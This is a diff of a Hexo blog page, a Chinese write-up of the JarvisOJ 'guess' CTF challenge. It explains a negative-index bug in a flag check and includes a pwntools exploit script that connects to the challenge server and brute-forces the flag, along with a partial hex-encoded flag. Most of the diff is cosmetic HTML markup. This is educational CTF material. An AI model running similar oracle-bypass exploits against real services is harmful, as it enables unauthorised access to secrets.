@@ -15,10 +15,10 @@
 
 
 <html class="theme-next pisces use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 
 
@@ -32,8 +32,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -56,9 +56,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
@@ -131,7 +131,7 @@
 
 
 
-  <link rel="canonical" href="http://ama2in9.top/2020/09/03/jarvisOj_guess/"/>
+  <link rel="canonical" href="http://ama2in9.top/2020/09/03/jarvisOj_guess/">
 
 
 
@@ -227,7 +227,7 @@
           
           <li class="menu-item menu-item-home">
     <a href="/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
   </li>
         
         
@@ -235,7 +235,7 @@
           
           <li class="menu-item menu-item-about">
     <a href="/about/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
   </li>
         
         
@@ -243,7 +243,7 @@
           
           <li class="menu-item menu-item-tags">
     <a href="/tags/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
   </li>
         
         
@@ -251,7 +251,7 @@
           
           <li class="menu-item menu-item-categories">
     <a href="/categories/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
   </li>
         
         
@@ -259,7 +259,7 @@
           
           <li class="menu-item menu-item-archives">
     <a href="/archives/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
   </li>
 
       
@@ -269,7 +269,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />Search</a>
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
         </li>
       
     </ul>
@@ -289,9 +289,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="Searching..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -406,7 +404,7 @@
           </span>
 
           
-            <span class="post-category" >
+            <span class="post-category">
             
               <span class="post-meta-divider">|</span>
             
@@ -434,8 +432,7 @@
                 </span>
                 <a href="/2020/09/03/jarvisOj_guess/#comments" itemprop="discussionUrl">
                 
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2020/09/03/jarvisOj_guess/" itemprop="commentCount"></span>
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/09/03/jarvisOj_guess/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -479,7 +476,7 @@
 <p>调用这个函数前有一个fgets(inbuf,0x1000,stdin)，如果长度这么长，那么在flag_hexa = flag_hex的时候构造一个100*’A’+’\x00’即可绕过长度检查，造成溢出，不过这个测试之后发现好像没什么用，fuzz没什么异常，继续看函数，里面check flag是通过跟一个预存在栈上的flag数组对比确定的，但是是通过bin_by_hex这个数组做了一次映射确定，而这个数组初始化又是由0x401100LL地址上的数据完成的，有趣的是这个数组的0x30处正是0，其ascii码也是0x30，同理A-F的ascii码对应其数组的索引。因此这个比较只需要用户按顺序输入flag即可，这个比较当然不如直接让用户输入和flag对比来的快，所以这里面一定有什么设计。</p>
 <p><img src="/2020/09/03/jarvisOj_guess/1.jpg" alt="code"><br><img src="/2020/09/03/jarvisOj_guess/2.jpg" alt="code2"><br><img src="/2020/09/03/jarvisOj_guess/3.jpg" alt="bin_by_hex"></p>
 <h2 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h2><p>漏洞就出现在数组索引的检查，数组其实就是一个字符串指针，array[i]等同于*(array+i)，所以当i为负数时，其得到的数据是字符串指针低地址处的数据，这里的flag位置是ebp-0x150，bin_hex_index的位置在ebp-0x110，因此bin_hex_index[-0x40]即flag[0]，想要验证成功，只需value1 = 0,value2 = flag[i]。flag[i] = bin_hex_index[-0x40+i]，即用户输入chr(-0x40+i)，但是注意chr()范围是0-256，因此-0x40+i需要+0x100(模100类似格式化字符串以前的知识)，最终构造出一个完美验证通过的payload。<br>仅仅通过验证不是目的，我们还得知道真正的flag是什么，这里因为我们已经通过payload通过了验证，那么现在只需要修改Payload的第一、二字节，使其为ascii(20-127)，重复验证，一旦得到通过即可确定第一个字节，后面的也同理，两个字节两个字节的确定，直到所有payload都被替换成真正的flag</p>
-<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"error"</span>)</span><br><span class="line">sh = remote(<span class="string">'pwn.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'guess&gt; '</span>)</span><br><span class="line">    sh.sendline(data)</span><br><span class="line">    response = sh.recvline().strip(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">'Nope.'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">init_payload = <span class="string">''</span></span><br><span class="line">offset = <span class="number">0x100</span><span class="number">-0x40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        init_payload += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        init_payload += chr(offset + (i<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> len(init_payload)</span><br><span class="line"><span class="comment">#init_payload = "504354467b3439643433313061313038353837353536373933323635316535353965313533636663386264323762340" + init_payload[95:]</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>,<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">128</span>):</span><br><span class="line">            temp = hex(j)[<span class="number">2</span>:]</span><br><span class="line">            init_payload = init_payload[:i] + temp.ljust(<span class="number">2</span>,<span class="string">'0'</span>) + init_payload[i+<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> guess(init_payload) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> str(i)+<span class="string">':'</span>+init_payload</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> init_payload</span><br><span class="line">flag = init_payload.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"error"</span>)</span><br><span class="line">sh = remote(<span class="string">'pwn.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'guess&gt; '</span>)</span><br><span class="line">    sh.sendline(data)</span><br><span class="line">    response = sh.recvline().strip(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">'Nope.'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">init_payload = <span class="string">''</span></span><br><span class="line">offset = <span class="number">0x100</span><span class="number">-0x40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        init_payload += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        init_payload += chr(offset + (i<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> len(init_payload)</span><br><span class="line"><span class="comment">#init_payload = "504354467b3439643433313061313038353837353536373933323635316535353965313533636663386264323762340" + init_payload[95:]</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>,<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">128</span>):</span><br><span class="line">            temp = hex(j)[<span class="number">2</span>:]</span><br><span class="line">            init_payload = init_payload[:i] + temp.ljust(<span class="number">2</span>,<span class="string">'0'</span>) + init_payload[i+<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> guess(init_payload) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> str(i)+<span class="string">':'</span>+init_payload</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> init_payload</span><br><span class="line">flag = init_payload.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
 <p>中间recv会报timeout，可以修改for循环start，断点验证，之后hex_encode即可</p>
 <h2 id="编外"><a href="#编外" class="headerlink" title="编外"></a>编外</h2><p>看别人的wp有说patch改掉alarm然后方便调试的，这里也记录一下吧，虽然自己没调试</p>
 <p>找到call _alarm位置，option-&gt;general,number of opcode bytes改为8<br>选中mov edi,78h call _alarm,打开Edit-&gt;Patch Program-&gt;change bytes<br>最后Edit-&gt;Patch Program-&gt;Apply patches to input file</p>
@@ -507,14 +504,14 @@
 
     
       <div id="wechat" style="display: inline-block">
-        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay"/>
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay">
         <p>WeChat Pay</p>
       </div>
     
 
     
       <div id="alipay" style="display: inline-block">
-        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay"/>
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay">
         <p>Alipay</p>
       </div>
     
@@ -540,8 +537,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/09/03/hxb_jjj_axb_swpuctf/" rel="next" title="湖湘杯决赛/TCTF2019/京津冀线下/安洵杯线上/SWPUCTF 部分pwn writeup">
-                <i class="fa fa-chevron-left"></i> 湖湘杯决赛/TCTF2019/京津冀线下/安洵杯线上/SWPUCTF 部分pwn writeup
+              <a href="/2020/09/03/Huwangbei/" rel="next" title="护网杯预选赛pwn部分writeup">
+                <i class="fa fa-chevron-left"></i> 护网杯预选赛pwn部分writeup
               </a>
             
           </div>
@@ -550,8 +547,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/09/03/jarvisOj-level4/" rel="prev" title="jarvisOj-level4">
-                jarvisOj-level4 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/09/03/hxb_jjj_axb_swpuctf/" rel="prev" title="湖湘杯决赛/TCTF2019/京津冀线下/安洵杯线上/SWPUCTF 部分pwn writeup">
+                湖湘杯决赛/TCTF2019/京津冀线下/安洵杯线上/SWPUCTF 部分pwn writeup <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -621,9 +618,7 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image"
-                src="/images/head.png"
-                alt="ama2in9" />
+              <img class="site-author-image" itemprop="image" src="/images/head.png" alt="ama2in9">
             
               <p class="site-author-name" itemprop="name">ama2in9</p>
               <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
@@ -636,7 +631,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">75</span>
+                    <span class="site-state-item-count">76</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -865,7 +860,7 @@
 
 
 
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.9.0</div>
 
 
 
@@ -1404,5 +1399,5 @@
   
 <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
 
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
 </html>
